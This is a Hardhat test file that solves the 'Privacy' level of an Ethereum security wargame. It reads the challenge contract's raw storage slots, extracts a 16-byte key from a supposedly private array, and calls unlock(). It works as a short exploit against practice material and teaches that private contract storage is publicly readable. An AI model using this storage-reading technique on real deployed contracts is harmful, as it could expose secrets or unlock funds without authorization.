import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Privacy`);
  const challengeAddress = await createChallenge(
    `0x11343d543778213221516D004ED82C45C3c8788B`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
  // storage is allocated to slots like this:
  // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html
  // 0: locked
  // 1: ID
  // 2: flattening, denomination, awkwardness (storage can be packed into a 256 bit slot)
  // 3: data[0] (because **fixed** size array)
  // 4: data[1]
  // 5: data[2]
  const storageSlots = [0, 1, 2, 3, 4, 5, 6]
  for(const slot of storageSlots) {
    const slotData = await eoa.provider!.getStorageAt(challenge.address, slot)
    console.log(`${slot}:\t ${slotData} (${BigNumber.from(slotData).toString()})`)
  }

  console.log(`Printing data static array`)
  for(const slot of [0, 1, 2]) {
    const slotData = await eoa.provider!.getStorageAt(challenge.address, 3 + slot)
    console.log(`data[${slot}]:\t ${slotData} (${Buffer.from(slotData, `hex`).toString(`utf8`)})`)
  }

  const keyData = await eoa.provider!.getStorageAt(challenge.address, 5 /* data[2] */)
  // seems to take the most significant bits data[2][0..15] when doing bytes16(data[2])
  const key16 = `${keyData.slice(0, 34)}` // bytes16 = 16 bytes
  tx = await challenge.unlock(key16)
  await tx.wait()
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
